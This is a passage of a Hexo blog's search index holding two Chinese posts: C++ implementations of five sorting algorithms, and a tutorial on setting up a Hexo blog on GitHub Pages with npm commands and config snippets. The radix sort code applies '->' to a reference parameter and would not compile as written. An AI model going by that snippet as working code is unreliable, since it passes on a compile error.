class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;void QuickSort(int a[], int m, int n)&#123;    if (m &gt;&#x3D; n)        return;    int low &#x3D; m;    int high &#x3D; n;    int pivot &#x3D; a[(m + n) &#x2F; 2];    while (low &lt;&#x3D; high)    &#123;        while (a[low] &lt; pivot)            low++;        while (a[high] &gt; pivot)            high--;        if (low &lt;&#x3D; high)        &#123;            swap(a[low], a[high]);            low++;            high--;        &#125;    &#125;    QuickSort(a, m, high);    QuickSort(a, low, n);&#125;</code></pre><p><strong>选择排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void Select(Sqlist &amp;L)&#123;    for (int i &#x3D; 0; i &lt; L.length - 1; i++)    &#123;        int k &#x3D; i;        for (int j &#x3D; i + 1; j &lt; L.length; j++)        &#123;            if (L.data[j] &lt; L.data[k])            &#123;                k &#x3D; j;            &#125;        &#125;        if (k !&#x3D; i)        &#123;            swap(L.data[i], L.data[k]);        &#125;    &#125;&#125;</code></pre><p><strong>堆排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void HeapAdjust(Sqlist &amp;L, int s, int m)&#x2F;&#x2F; s: 待调整的子树根节点下标  m：最后一个元素的下标（调整范围上限）&#123;    int rc &#x3D; L.data[s];    &#x2F;&#x2F; 沿关键字较大的子节点向下筛选    for (int j &#x3D; 2 * s + 1; j &lt;&#x3D; m; j &#x3D; 2 * j + 1) &#x2F;&#x2F; 完全二叉树 左孩子下标2k+1    &#123;        &#x2F;&#x2F; 比较左右孩子，j指向较大的孩子        if (j &lt; m &amp;&amp; L.data[j] &lt; L.data[j + 1])            j &#x3D; j + 1; &#x2F;&#x2F; 右孩子更大，j指向右孩子        &#x2F;&#x2F; 若根节点已比最大孩子大，则调整完成        if (rc &gt;&#x3D; L.data[j])            break;        L.data[s] &#x3D; L.data[j]; &#x2F;&#x2F; 将较大孩子值上移        s &#x3D; j;                 &#x2F;&#x2F; s指向下一层待比较位置    &#125;    L.data[s] &#x3D; rc; &#x2F;&#x2F; 将最初根节点值放入最终位置&#125;void CreateHeap(Sqlist &amp;L)&#123;    &#x2F;&#x2F; 从最后一个非叶子节点开始向前调整    for (int i &#x3D; L.length &#x2F; 2 - 1; i &gt;&#x3D; 0; i--)    &#123;        HeapAdjust(L, i, L.length - 1); &#x2F;&#x2F; 调整以i为根的子树    &#125;&#125;void HeapSort(Sqlist &amp;L)&#123;    CreateHeap(L);    for (int i &#x3D; L.length - 1; i &gt; 0; i--)    &#123;        swap(L.data[0], L.data[i]); &#x2F;&#x2F; 堆顶最大值交换到末尾        HeapAdjust(L, 0, i - 1);    &#x2F;&#x2F; 调整剩余元素为新堆    &#125;&#125;</code></pre><p><strong>归并排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;void Merge(Sqlist &amp;L, int low, int mid, int high)&#123;    int *temp &#x3D; new int[high - low + 1];    int i &#x3D; low;     &#x2F;&#x2F; 左半部分起始索引    int j &#x3D; mid + 1; &#x2F;&#x2F; 右半部分起始索引    int k &#x3D; 0;       &#x2F;&#x2F; 临时数组索引    &#x2F;&#x2F; 合并元素到临时数组    while (i &lt;&#x3D; mid &amp;&amp; j &lt;&#x3D; high)    &#123;        if (L.data[i] &lt;&#x3D; L.data[j])            temp[k++] &#x3D; L.data[i++];        else            temp[k++] &#x3D; L.data[j++];    &#125;    &#x2F;&#x2F; 处理剩余元素    while (i &lt;&#x3D; mid)        temp[k++] &#x3D; L.data[i++];    while (j &lt;&#x3D; high)        temp[k++] &#x3D; L.data[j++];    &#x2F;&#x2F; 将排序好的数据拷贝回原数组    for (i &#x3D; low, k &#x3D; 0; i &lt;&#x3D; high; i++, k++)        L.data[i] &#x3D; temp[k];    delete[] temp; &#x2F;&#x2F; 释放临时数组&#125;&#x2F;&#x2F; 递归分治函数void MSort(Sqlist &amp;L, int low, int high)&#123;    if (low &lt; high)    &#123;        int mid &#x3D; (low + high) &#x2F; 2; &#x2F;&#x2F; 计算中间位置        MSort(L, low, mid);         &#x2F;&#x2F; 递归左半部分        MSort(L, mid + 1, high);    &#x2F;&#x2F; 递归右半部分        Merge(L, low, mid, high);   &#x2F;&#x2F; 合并已排序部分    &#125;&#125;&#x2F;&#x2F; 归并排序入口函数void MergeSort(Sqlist &amp;L)&#123;    if (L.length &lt;&#x3D; 0)        return;    MSort(L, 0, L.length - 1); &#x2F;&#x2F; 调用递归排序&#125;</code></pre><p><strong>基数排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;&#x2F;&#x2F; 以位数比较为例void RadixSort(Sqlist &amp;L)&#123;    if (L-&gt;length &lt;&#x3D; 1)        return;    int max_num &#x3D; L-&gt;data[0];    for (int i &#x3D; 1; i &lt; L-&gt;length; ++i)    &#123;        if (L-&gt;data[i] &gt; max_num)            max_num &#x3D; L-&gt;data[i];    &#125;    for (int exp &#x3D; 1; max_num &#x2F; exp &gt; 0; exp *&#x3D; 10)    &#123;        int count[10] &#x3D; &#123;0&#125;;        int output[MAXSIZE];        for (int i &#x3D; 0; i &lt; L-&gt;length; ++i)        &#123;            int digit &#x3D; (L-&gt;data[i] &#x2F; exp) % 10;            count[digit]++;        &#125;        for (int j &#x3D; 1; j &lt; 10; ++j)        &#123;            count[j] +&#x3D; count[j - 1];        &#125;        for (int i &#x3D; L-&gt;length - 1; i &gt;&#x3D; 0; --i)        &#123;            int digit &#x3D; (L-&gt;data[i] &#x2F; exp) % 10;            output[count[digit] - 1] &#x3D; L-&gt;data[i];            count[digit]--;        &#125;        for (int i &#x3D; 0; i &lt; L-&gt;length; ++i)        &#123;            L-&gt;data[i] &#x3D; output[i];        &#125;    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo-Blog搭建教程</title>
      <link href="/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
      <url>/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/1.png"></p><p>在思考如何搭建个人博客时，我决定采用了<code>Hexo</code>+<code>Github Pages</code>的方案。</p><ul><li>纯静态资源网站，只需修改前端代码和资源文件</li><li><code>Github</code>托管，免费且易于维护</li><li><code>Hexo</code>提供了优秀的博客模板和便捷的命令行</li></ul><h2 id="参考资料">参考资料</h2><p>官方文档：<a href="https://hexo.io/zh-cn/docs/configuration">配置 |Hexo</a></p><p>大佬的博客1：<a href="https://bg51717.github.io/13640/">Hexo+Github搭建个人Wiki风格博客| Blogs</a></p><p>大佬的博客2：[<a href="https://aiyoja.github.io/20220704/">三万字教程]基于Hexo的matery主题搭建博客并深度优化一站式完全教程- 游颜色</a></p><h2 id="环境搭建">环境搭建</h2><h3 id="基本工具">基本工具</h3><p>搭建过程中，需要利用<code>npm</code>下载相关包，用<code>git</code>上传到指定仓库。</p><ul><li><a href="https://link.zhihu.com/?target=https%3A//nodejs.org/zh-cn">Node.js</a></li><li><a href="https://link.zhihu.com/?target=https%3A//git-scm.com/downloads">git</a></li></ul><p>具体如何安装使用请自行搜索。</p><h3 id="项目部署">项目部署</h3><p>1.在<code>Github</code>上创建一个仓库并取名为<code>用户名.github.io</code></p><p>2.准备一个空文件夹，在文件夹里打开终端，使用<code>npm</code>一键安装<code>Hexo</code>博客程序</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli</code></pre><p>3.进行<code>Hexo</code>初始化</p><pre class="language-bash" data-language="bash"><code class="language-bash">hexo init </code></pre><p>4.使用<code>npm</code>安装<code>package.json</code>里面的依赖</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span></code></pre><p>5.安装用于部署的包<code>hexo-deployer-git</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token parameter variable">--save</span></code></pre><p>6.修改<code>_config.yml</code>文件末尾的<code>Deployment</code>部分（善用查找！）</p><p><strong>这里建议大家用<code>SSH</code>配置，可以避免网络等问题</strong>。</p><p><a href="https://blog.csdn.net/weixin_42569846/article/details/105808683">Hexo使用SSH连接GitHub_hexo的ssh连接github-CSDN博客</a></p><pre class="language-none"><code class="language-none">deploy:    type: git  repo: git@github.com:你的用户名&#x2F;你的仓库名.git    branch: main</code></pre><h3 id="主题安装">主题安装</h3><p>我选择的是<code>matery</code>，大家也可以去搜索自己喜欢的主题。</p><p><a href="https://bgithub.xyz/blinkfox/hexo-theme-matery">GitHub -blinkfox/hexo-theme-matery</a></p><p>具体安装视官方文档而定，大部分可以这么安装。</p><pre class="language-none"><code class="language-none">cd &lt;Your Location&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;blinkfox&#x2F;hexo-theme-matery.git</code></pre><p>随后，请修改<strong>主文件夹下的</strong><code>_config.yml</code>的<code>theme</code>。</p><blockquote><p>有两个<code>_config.yml</code>？</p></blockquote><h3 id="公式-mathjax">公式-Mathjax</h3><p>1.卸载部分插件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> un hexo-math<span class="token function">npm</span> un hexo-renderer-marked</code></pre><p>2.安装<code>hexo-renderer-pandoc</code>渲染器</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i hexo-renderer-pandoc</code></pre><p>3.配置主题配置下的<code>mathjax</code>设置(文件位置在<code>\themes\{主题名}\ _config.yml</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># MathJax</span>mathjax:  enable: <span class="token boolean">true</span>  per_page: <span class="token boolean">true</span></code></pre><p>4.安装<code>Pandoc</code></p><p>去<code>Pandoc</code>官网下载最新版本：<a href="https://pandoc.org/index.html">Pandoc - About pandoc</a></p><p>安装完将<code>_post</code>里的<code>md</code>文件写入公式测试即可。</p><h3 id="图片">图片</h3><p>修改<code>_config.yml</code>如下：</p><pre class="language-text" data-language="text"><code class="language-text">post_asset_folder: truemarked:  prependRoot: true  postAsset: true</code></pre><p>在文件夹下打开终端，使用<code>hexo new [layout] &lt;title&gt;</code>命令创建一篇新文章（也可以手动创建），此时会在<code>source/_post</code>目录下创建一个同名的文件夹和<code>md</code>文件。接着可以把所有该文章有关的资源文件都放在同名的目录中，在<code>md</code>文件中使用引入格式<code>![image1](image1.png)</code>即可引入图片（如果是网络资源引用网址即可）。</p><h2 id="四大命令">四大命令</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hexo clean <span class="token comment"># 清除生成的网页文件</span>hexo g     <span class="token comment"># 生成静态网页</span>hexo s     <span class="token comment"># 本地运行博客</span>hexo d     <span class="token comment"># 将网页文件推送至远程服务器</span></code></pre><h2 id="问题记录">问题记录</h2><blockquote><p>所有问题的排查，请善用F12控制台的报错信息</p></blockquote><h3 id="渲染报错">渲染报错</h3><pre class="language-none"><code class="language-none">Uncaught TypeError: $(...).lightGallery is not a function</code></pre><p><a href="https://cloud.tencent.com/developer/ask/sof/113583944">Uncaught：$(.).lightGallery不是函数-腾讯云开发者社区-腾讯云</a></p><p>把所有本地硬编码替换成<code>cdn</code>，包括<code>_config.yml</code>里的<code>lib</code>和<code>main-style.ejs/layout.ejs</code>的引用。</p><pre class="language-none"><code class="language-none">lightgallery:https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;lightgallery&#x2F;1.10.0&#x2F;css&#x2F;lightgallery.css</code></pre><pre class="language-none"><code class="language-none">&lt;script src&#x3D;&quot;&lt;%- theme.libs.js.lightgallery %&gt;&quot;&gt;&lt;&#x2F;script&gt;</code></pre><pre class="language-none"><code class="language-none">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;&lt;%- theme.libs.css.lightgallery %&gt;&quot;&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
